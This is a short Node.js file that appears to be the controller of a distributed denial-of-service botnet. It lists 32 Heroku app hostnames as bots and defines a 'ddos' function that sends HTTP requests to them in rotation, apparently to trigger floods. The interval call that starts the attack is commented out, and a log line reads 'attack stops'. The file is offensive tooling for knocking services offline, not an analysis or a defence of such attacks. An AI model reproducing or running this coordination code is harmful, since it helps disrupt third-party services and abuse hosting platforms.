const http=require('http')
const https=require('https')
const express = require("express")
const hostname='0.0.0.0';
const port=process.env.PORT || 8021;
const app=express();
const server=http.createServer(app)
const botArray=["tatras4","tatras5","tatras6","tatras7","tatras8","tatras9","tatras10","tatras11","tatras12","tatras13","fadros","fedros","pytras","accalia","admetus","felixsa","ethanio","caspas","thorax","thoru","fagona","fagrus","cypruss","gapris","tikana","takris","fadnavis","crocasa","rasmon","rassas","dasnoma","dhanisa"]
const listener=server.listen(port,hostname,()=>{console.log("Server spinned up on port "+listener.address().port)});
app.get("/",(req,res,next)=>{
res.send("randiap")
res.end()

})
// process.on("message",(msg)=>{
// ddos(msg.initial)
// })

// setInterval(ddos,1)
console.log("attack stops")
var count=0;
function ddos(){

    const uril="http://"+botArray[count]+".herokuapp.com?index="+count+"count=3"
    count=count+4;
    if(count>=botArray.length) count=0;
    http.get(uril, {headers:{ 'User-Agent': 'Node Server' }},(resp) => {
        let pythonData = '';
      
        // A chunk of data has been recieved.
        resp.on('data', (chunk) => {
          pythonData += chunk;
        });
      
        // The whole response has been received. Print out the result.
        resp.on('end', () => {
            // console.log(pythonData + botArray[count-4])
        });
      
      }).on("error", (err) => {
        console.log("Error: " + err.message);
      });
}